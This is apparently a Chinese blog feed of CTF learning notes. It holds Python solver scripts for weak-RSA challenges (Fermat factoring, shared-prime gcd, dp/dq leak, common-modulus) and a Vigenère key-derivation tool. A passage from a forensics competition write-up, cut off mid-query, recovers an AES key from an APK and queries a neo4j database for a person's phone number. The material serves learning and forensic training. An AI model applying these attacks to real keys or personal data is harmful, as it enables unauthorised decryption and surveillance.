class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 推导密钥</span></span><br><span class="line">        key = find_vigenere_key(plaintext, ciphertext)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n推导得到的密钥是: <span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 验证密钥是否正确</span></span><br><span class="line">        <span class="comment"># 维吉尼亚加密函数用于验证</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">vigenere_encrypt</span>(<span class="params">text, key</span>):</span><br><span class="line">            encrypted = []</span><br><span class="line">            key_len = <span class="built_in">len</span>(key)</span><br><span class="line">            <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(text):</span><br><span class="line">                k_char = key[i % key_len]</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> char.isalpha() <span class="keyword">and</span> k_char.isalpha():</span><br><span class="line">                    <span class="comment"># 都是字母，进行加密</span></span><br><span class="line">                    is_upper = char.isupper()</span><br><span class="line"></span><br><span class="line">                    t_val = <span class="built_in">ord</span>(char.upper()) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">                    k_val = <span class="built_in">ord</span>(k_char.upper()) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">                    c_val = (t_val + k_val) % <span class="number">26</span></span><br><span class="line"></span><br><span class="line">                    encrypted_char = <span class="built_in">chr</span>(c_val + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> is_upper:</span><br><span class="line">                        encrypted_char = encrypted_char.lower()</span><br><span class="line"></span><br><span class="line">                    encrypted.append(encrypted_char)</span><br><span class="line">                <span class="keyword">elif</span> <span class="keyword">not</span> char.isalpha() <span class="keyword">and</span> <span class="keyword">not</span> k_char.isalpha():</span><br><span class="line">                    <span class="comment"># 都不是字母，保持不变</span></span><br><span class="line">                    encrypted.append(char)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># 一个是字母，一个不是字母，无法加密</span></span><br><span class="line">                    <span class="keyword">raise</span> ValueError(<span class="string">f&quot;明文和密钥在位置 <span class="subst">&#123;i&#125;</span> 处不匹配（一个是字母，一个是非字母）&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(encrypted)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 使用推导出的密钥加密明文，检查是否与密文一致</span></span><br><span class="line">        verified_ciphertext = vigenere_encrypt(plaintext, key)</span><br><span class="line">        <span class="keyword">if</span> verified_ciphertext == ciphertext:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;验证成功: 使用该密钥加密明文得到的结果与输入的密文一致&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;验证失败: 使用该密钥加密得到 <span class="subst">&#123;verified_ciphertext&#125;</span>，与输入的密文不一致&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">维吉尼亚密码密钥推导工具</span></span><br><span class="line"><span class="string">-------------------------</span></span><br><span class="line"><span class="string">请输入明文: 0xGame</span></span><br><span class="line"><span class="string">请输入密文: 0lCcop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">推导得到的密钥是: 0oWccl</span></span><br><span class="line"><span class="string">验证成功: 使用该密钥加密明文得到的结果与输入的密文一致</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">进程已结束，退出代码为 0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h4 id="RSA"><a class="header-anchor" href="#RSA">¶</a>RSA</h4><h5 id="RSA-算法原理"><a class="header-anchor" href="#RSA-算法原理">¶</a>RSA 算法原理</h5><ul><li>基于<strong>大整数分解难题（IFP）</strong>，是目前最广泛使用的非对称加密算法。</li><li>生成公私钥</li></ul><ol><li><strong>选取大素数</strong>：选择两个不同大素数 $p$ 和 $q$，计算 $N = p \cdot q$。</li><li><strong>欧拉函数</strong>：计算 $\varphi(N) = (p-1)(q-1)$。若 $p$ 为素数，则 $\varphi(p) = p-1$。<br>$\varphi(N)$ 表示小于 $N$ 且与 $N$ 互质的数的个数。</li><li><strong>选择公钥指数</strong>：选整数 $e$ 满足 $1 &lt; e &lt; \varphi(N)$ 且 $\gcd(e, \varphi(N)) = 1$。</li><li><strong>计算私钥指数</strong>：求 $e$ 在模 $\varphi(N)$ 下的乘法逆元 $d$，即 $e \cdot d \equiv 1 \pmod{\varphi(N)}$。<br><strong>乘法逆元</strong>：若 $a \cdot b \equiv 1 \pmod{m}$，则 $b$ 是 $a$ 在模 $m$ 下的逆元。</li><li><strong>销毁中间变量</strong>：删除 $p$ 和 $q$，保留 $(N, e)$ 为公钥，$(N, d)$ 为私钥。</li></ol><ul><li>加解密过程<ul><li><strong>加密</strong>：将明文 $m$ 转为数字，计算密文 $c \equiv m^e \pmod{N}$。</li><li><strong>解密</strong>：使用私钥计算明文 $m \equiv c^d \pmod{N}$。<ul><li>常见过程：—&gt;求d—&gt;求欧拉函数—&gt;求大素数–&gt;如何得到素数</li></ul></li></ul></li></ul><h5 id="补充：欧拉函数及其性质"><a class="header-anchor" href="#补充：欧拉函数及其性质">¶</a>补充：欧拉函数及其性质</h5><ul><li>多因子计算欧拉函数<br><img src="/images/c-1.png" alt="img"></li><li>高阶的pq计算欧拉函数<br><img src="/images/c-2.png" alt="img"><br><img src="/images/c-3.png" alt="img"></li></ul><h5 id="补充：模的性质"><a class="header-anchor" href="#补充：模的性质">¶</a>补充：模的性质</h5><p><img src="/images/c-4.png" alt="img"></p><h5 id="题目类型"><a class="header-anchor" href="#题目类型">¶</a>题目类型</h5><h6 id="基础RSA"><a class="header-anchor" href="#基础RSA">¶</a>基础RSA</h6><ul><li>RSA常见脚本：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h6 id="分解N"><a class="header-anchor" href="#分解N">¶</a>分解N</h6><ul><li>本地工具（yafu打开cmd使用，<ul><li>分解因数n：.\yafu-x64.exe “factor(n)”</li></ul></li><li><a href="https://factordb.com/">在线网站</a><ul><li>注意！！！点数字后就到上方框里了可以复制！！！（有点愚蠢但愚蠢的人没发现</li></ul></li></ul><h6 id="pq相邻素数"><a class="header-anchor" href="#pq相邻素数">¶</a>pq相邻素数</h6><ul><li>特征：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = gmpy2.next_prime(p)</span><br></pre></td></tr></table></figure><ul><li>解法：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sn = isqrt(n)</span><br><span class="line">q = next_prime(sn)</span><br><span class="line">p = n // q</span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h6 id="pq相近"><a class="header-anchor" href="#pq相近">¶</a>pq相近</h6><ul><li>特征：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">q = gmpy2.next_prime(p - getPrime(<span class="number">128</span>)+getPrime(<span class="number">128</span>)-getPrime(<span class="number">256</span>)+getPrime(<span class="number">256</span>))</span><br></pre></td></tr></table></figure><ul><li>解法：费马分解</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fermat_attack</span>(<span class="params">n</span>):</span><br><span class="line">    a = isqrt(n)</span><br><span class="line">    b2 = a*a - n</span><br><span class="line">    b = isqrt(n)</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b*b != b2:</span><br><span class="line">        a = a + <span class="number">1</span></span><br><span class="line">        b2 = a*a - n</span><br><span class="line">        b = isqrt(b2)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    p = a+b</span><br><span class="line">    q = a-b</span><br><span class="line">    <span class="keyword">assert</span> n == p * q</span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line">p, q = fermat_attack(n)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h6 id="共享素数"><a class="header-anchor" href="#共享素数">¶</a>共享素数</h6><ul><li>例题：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;***********&#x27;</span></span><br><span class="line"></span><br><span class="line">p1 = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">p2 = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">n1 = p1*q</span><br><span class="line">n2 = p2*q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e, n1)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e, n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n1 = <span class="subst">&#123;n1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n2 = <span class="subst">&#123;n2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1 = <span class="subst">&#123;c1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c2 = <span class="subst">&#123;c2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n1 = </span></span><br><span class="line"><span class="string">n2 = </span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c1 = </span></span><br><span class="line"><span class="string">c2 = </span></span><br></pre></td></tr></table></figure><ul><li>解法：求最小公因数</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">q = gcd(n1, n2)</span><br><span class="line">p1 = n1 // q</span><br><span class="line">phi = (p1-1)*(q-1)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line"></span><br><span class="line">m = pow(c1, d, n1)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h6 id="多个素数"><a class="header-anchor" href="#多个素数">¶</a>多个素数</h6><ul><li>特征：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q*r</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li>解法：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">n=p*q*r</span><br><span class="line">phi = (p-1)*(q-1)*(r-1)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h6 id="素数中有高阶次方"><a class="header-anchor" href="#素数中有高阶次方">¶</a>素数中有高阶次方</h6><ul><li>思路：素数中有高阶次方求欧拉</li></ul><p><img src="/img/%E9%80%9F%E6%88%90crypto%E8%A7%86%E9%A2%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_s-6.png" alt="alt text"></p><ul><li>解法：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = (p**<span class="number">7</span>)*q <span class="comment"># 特征</span></span><br><span class="line"></span><br><span class="line">phi = (p**<span class="number">6</span>)*(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h6 id="dpdq泄露"><a class="header-anchor" href="#dpdq泄露">¶</a>dpdq泄露</h6><ul><li>特征：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;easy_RSA888888888888&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">e = getPrime(<span class="number">128</span>)</span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">dp = d % (p-<span class="number">1</span>)</span><br><span class="line">dq = d % (q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;dp = <span class="subst">&#123;dp&#125;</span>&#x27;</span>) <span class="comment"># 特征</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;dq = <span class="subst">&#123;dq&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>思路：存脚本</li></ul><p><img src="/img/%E9%80%9F%E6%88%90crypto%E8%A7%86%E9%A2%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_s-7.png" alt="alt text"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">c = </span><br><span class="line">dp = </span><br><span class="line">dq = </span><br><span class="line"></span><br><span class="line">invp = invert(p, q)</span><br><span class="line">m1 = powmod(c, dp, p)</span><br><span class="line">m2 = powmod(c, dq, q)</span><br><span class="line">m = (((m2 - m1)*invp) % q)*p + m1</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h6 id="共模攻击"><a class="header-anchor" href="#共模攻击">¶</a>共模攻击</h6><ul><li>特征</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e1 = getPrime(<span class="number">16</span>)</span><br><span class="line">e2 = getPrime(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e1, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e2, n)</span><br></pre></td></tr></table></figure><ul><li>思路：存脚本</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">e1 = <span class="number">55313</span></span><br><span class="line">e2 = <span class="number">44647</span></span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">_, s1, s2 = gcdext(e1, e2)</span><br><span class="line"></span><br><span class="line">m = powmod(c1, s1, n)*powmod(c2, s2, n) % n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="知识补充"><a class="header-anchor" href="#知识补充">¶</a>知识补充</h3><ul><li>getPrime() 函数<ul><li>在Python中通常来自 Crypto.Util.number 模块，用于生成指定位数的随机<strong>质数</strong></li></ul></li><li>python中invert和inverse函数在ctf crypto题目应用区别<ul><li>gmpy2.invert (通常更快)</li><li>当逆元不存在时（gcd(a, n) != 1）</li></ul></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gmpy2.invert 返回 None</span></span><br><span class="line">result1 = invert(<span class="number">4</span>, <span class="number">8</span>)  <span class="comment"># gcd(4,8)=4 != 1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;gmpy2.invert(4,8) = <span class="subst">&#123;result1&#125;</span>&quot;</span>)  <span class="comment"># None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Crypto.Util.number.inverse 抛出异常</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    result2 = inverse(<span class="number">4</span>, <span class="number">8</span>)</span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Crypto.inverse(4,8) 错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识点笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025平航杯结合SPC出题</title>
      <link href="/2025/10/16/2025%E5%B9%B3%E8%88%AA%E6%9D%AF%E7%BB%93%E5%90%88SPC%E5%87%BA%E9%A2%98/"/>
      <url>/2025/10/16/2025%E5%B9%B3%E8%88%AA%E6%9D%AF%E7%BB%93%E5%90%88SPC%E5%87%BA%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="题目背景"><a class="header-anchor" href="#题目背景">¶</a>题目背景</h3><p>爱⽽不得，进而由爱生恨。作为有黑客背景的他，激发出了强烈的占有欲，虽然不能在真实物理世界成 为她的伴侣，但在虚拟世界⾥，他执着的要成为她的主宰，于是，我们的故事开始了……。手机，电 脑，服务器，⽊⻢，AI，Iot设备……无⼀幸免的都成为他的作案⼯具或⽬标，但最终在诸位明察秋毫的取证达人面前，都无处遁形，作恶者终将被绳之以法。追悔莫及的他最后终于明⽩，其实真正的爱，不是占有，而是放手！！！</p><p>2025年4⽉，杭州滨江警⽅接到辖区内市⺠刘晓倩(简称：倩倩)报案称：其个⼈电⼦设备疑似遭 ⼈监控。经初步调查，警⽅发现倩倩的手机存在可疑后台活动，手机可能存在被木马控制情况； 对倩倩计算机进⾏流量监控，捕获可疑流量包。遂启动电子数据取证程序。</p><p>警⽅通过对倩倩手机和恶意流量包的分析，锁定⼀名化名“起早王”的本地男子。经搜查其住所， 警⽅查扣⼀台个人电脑和服务器。技术分析显示，该服务器中存有与倩倩设备内同源的特制远控木马，可实时窃取手机摄像头、手机通信记录等相关敏感文件。进⼀步对服务器溯源，发现“起 早王”曾渗透其任职的科技公司购物网站，获得公司服务器权限，非法窃取商业数据并使用公司 的服务器搭建Trojan服务并作为跳板机实施远控。</p><p>请你结合以上案例并根据相关检材，完成下面的勘验工作。<br>密码：早起王的爱恋日记❤</p><h3 id="计算机取证"><a class="header-anchor" href="#计算机取证">¶</a>计算机取证</h3><h4 id="分析倩倩的手机检材-手机内Puzzle-Game拼图程序拼图APK中的Flag1是什么"><a class="header-anchor" href="#分析倩倩的手机检材-手机内Puzzle-Game拼图程序拼图APK中的Flag1是什么">¶</a>分析倩倩的手机检材,手机内Puzzle_Game拼图程序拼图APK中的Flag1是什么</h4><p><img src="/img/%E5%B9%B3%E8%88%AA%E6%9D%AF_p-1.png" alt="alt text"><br><img src="/img/%E5%B9%B3%E8%88%AA%E6%9D%AF_p-2.png" alt="alt text"></p><ul><li>在Java中，Byte.MAX_VALUE 是 127，Byte.MIN_VALUE = -128</li><li>密码：两种方法</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line">MAGIC_NUMBERS = [<span class="number">113</span>, <span class="number">99</span>, <span class="number">92</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">98</span>, <span class="number">54</span>, <span class="number">113</span>, <span class="number">104</span>, <span class="number">89</span>, <span class="number">117</span>, <span class="number">100</span>, <span class="number">113</span>, <span class="number">127</span>, <span class="number">124</span>, <span class="number">89</span>]</span><br><span class="line">key_bytes = <span class="built_in">bytearray</span>(<span class="built_in">len</span>(MAGIC_NUMBERS))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(MAGIC_NUMBERS)):</span><br><span class="line">    key_bytes[i] = MAGIC_NUMBERS[i] ^ <span class="number">6</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(key_bytes))</span><br><span class="line"><span class="comment"># &gt;&gt;&gt; b&#x27;weZl_d0wn_sbwyz_&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E5%B9%B3%E8%88%AA%E6%9D%AF_p-3.png" alt="alt text"></p><ul><li>密文其实是在下面的 hexStringToByteArray 方法中（理解不了一点伪C代码。。可能这位置靠猜？<br><img src="/img/%E5%B9%B3%E8%88%AA%E6%9D%AF_p-4.png" alt="alt text"></li><li>判断AES使用的是ECB模式<ul><li>如果代码中没有指定模式，通常是ECB</li><li>如果是CBC模式，通常会有IV参数</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">byte[] decrypted = decryptAESBlock(cipherBytes, expandedKey, iv);</span><br></pre></td></tr></table></figure><h4 id="7-分析起早王的计算机检材，SillyTavern中账户起早王的创建时间是什么时候-格式：2020-1-1-01-01-01"><a class="header-anchor" href="#7-分析起早王的计算机检材，SillyTavern中账户起早王的创建时间是什么时候-格式：2020-1-1-01-01-01">¶</a>7. 分析起早王的计算机检材，SillyTavern中账户起早王的创建时间是什么时候(格式：2020/1/1 01:01:01)</h4><ul><li>有毛病为啥SillyTavern搜索后找到文件夹，开启方式不在此文件下层，在上层的bat文件。。。</li><li>初步推测是因为SillyTavern账密在日记里，所以我搜到的是日记的日志文件？？？</li><li>SillyTavern账户密码在日记里，进入得到磁盘解密密码</li></ul><h4 id="很多思路都是找日志"><a class="header-anchor" href="#很多思路都是找日志">¶</a>很多思路都是找日志</h4><h4 id="9-分析起早王的计算机检材，SillyTavern中起早王与ai女友聊天所调用的语言模型-带文件后缀-格式：xxxxx-xxxxxxx-xxxx"><a class="header-anchor" href="#9-分析起早王的计算机检材，SillyTavern中起早王与ai女友聊天所调用的语言模型-带文件后缀-格式：xxxxx-xxxxxxx-xxxx">¶</a>9. 分析起早王的计算机检材，SillyTavern中起早王与ai女友聊天所调用的语言模型(带文件后缀)(格式：xxxxx-xxxxxxx.xxxx)</h4><ul><li>sq思路<br><img src="/img/%E5%B9%B3%E8%88%AA%E6%9D%AF_p-4.png" alt="alt text"></li></ul><h4 id="12-分析起早王的计算机检材，最早被换脸的图片所使用的换脸模型是什么-带文件后缀-格式：xxxxxxxxxxx-xxxx"><a class="header-anchor" href="#12-分析起早王的计算机检材，最早被换脸的图片所使用的换脸模型是什么-带文件后缀-格式：xxxxxxxxxxx-xxxx">¶</a>12. 分析起早王的计算机检材，最早被换脸的图片所使用的换脸模型是什么(带文件后缀)(格式：xxxxxxxxxxx.xxxx)</h4><ul><li>不知道为什么是model搜索后选这个？？？</li><li>文件夹搜索，everything好像搜索不到加密磁盘</li></ul><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&quot;face_detector_model&quot;: &quot;yoloface&quot;,</span><br><span class="line">&quot;face_landmarker_model&quot;: &quot;2dfan4&quot;,</span><br><span class="line">&quot;face_occluder_model&quot;: &quot;xseg_1&quot;,</span><br><span class="line">&quot;face_parser_model&quot;: &quot;bisenet_resnet_34&quot;,</span><br><span class="line">&quot;age_modifier_model&quot;: &quot;styleganex_age&quot;,</span><br><span class="line">&quot;deep_swapper_model&quot;: &quot;iperov/elon_musk_224&quot;,</span><br><span class="line">&quot;expression_restorer_model&quot;: &quot;live_portrait&quot;,</span><br><span class="line">&quot;face_editor_model&quot;: &quot;live_portrait&quot;,</span><br><span class="line">&quot;face_enhancer_model&quot;: &quot;gfpgan_1.4&quot;,</span><br><span class="line">&quot;face_swapper_model&quot;: &quot;inswapper_128_fp16&quot;, # 选了这个</span><br><span class="line">&quot;frame_colorizer_model&quot;: &quot;ddcolor&quot;,</span><br><span class="line">&quot;frame_enhancer_model&quot;: &quot;span_kendata_x4&quot;,</span><br><span class="line">&quot;lip_syncer_model&quot;: &quot;wav2lip_gan_96&quot;</span><br></pre></td></tr></table></figure><h4 id="13-分析起早王的计算机检材，neo4j中数据存放的数据库的名称是什么-格式：abd-ef"><a class="header-anchor" href="#13-分析起早王的计算机检材，neo4j中数据存放的数据库的名称是什么-格式：abd-ef">¶</a>13. 分析起早王的计算机检材，neo4j中数据存放的数据库的名称是什么(格式：abd.ef)</h4><ul><li>data/databases</li><li>找到graph.db</li></ul><h4 id="14-分析起早王的计算机检材，neo4j数据库中总共存放了多少个节点-格式：1"><a class="header-anchor" href="#14-分析起早王的计算机检材，neo4j数据库中总共存放了多少个节点-格式：1">¶</a>14. 分析起早王的计算机检材，neo4j数据库中总共存放了多少个节点(格式：1)</h4><ul><li>neo4j.bat console</li><li><a href="http://localhost:7474/">http://localhost:7474/</a></li><li>我的学习笔记里面找思维导图，有账密<br><img src="/img/%E5%B9%B3%E8%88%AA%E6%9D%AF_p-5.png" alt="alt text"></li><li>17088个</li></ul><h4 id="15-分析起早王的计算机检材，neo4j数据库内白杰的⼿机号码是什么-格式：12345678901"><a class="header-anchor" href="#15-分析起早王的计算机检材，neo4j数据库内白杰的⼿机号码是什么-格式：12345678901">¶</a>15. 分析起早王的计算机检材，neo4j数据库内白杰的⼿机号码是什么(格式：12345678901)</h4><ul><li>成功方案3个<ul><li>去除limit25后导出csv文件直接ctrl+F搜索</li><li>sq版本，一开始莫名其妙搜不到，后面手打成功了。。。</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (u:person &#123;name: &#x27;⽩杰&#x27;&#125;)</span><br><span class="line">RETURN u.mobile;</span><br></pre></td></tr></table></figure><ul><li>xc版本</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (n &#123;name:&#x27;白杰&#x27;&#125;)</span><br><span class="line">RETURN n;</span><br></pre></td></tr></table></figure><h4 id="16-分析起早王的计算机检材，分析neo4j数据库内数据，统计在2025年4月7日至13日期间使用非授权设备登录且登录地点超出其注册时登记的两个以上城市的⽤户数量-格式：1-【待学习】"><a class="header-anchor" href="#16-分析起早王的计算机检材，分析neo4j数据库内数据，统计在2025年4月7日至13日期间使用非授权设备登录且登录地点超出其注册时登记的两个以上城市的⽤户数量-格式：1-【待学习】">¶</a>16. 分析起早王的计算机检材，分析neo4j数据库内数据，统计在2025年4月7日至13日期间使用非授权设备登录且登录地点超出其注册时登记的两个以上城市的⽤户数量(格式：1)【待学习】</h4><ul><li>查了半天全是赛后复现。。放弃吧</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (u:User)-[:HAS_LOGIN]-&gt;(l:Login)-[:FROM_IP]-&gt;(ip:IP)</span><br><span class="line">MATCH (l)-[:USING_DEVICE]-&gt;(d:Device)</span><br><span 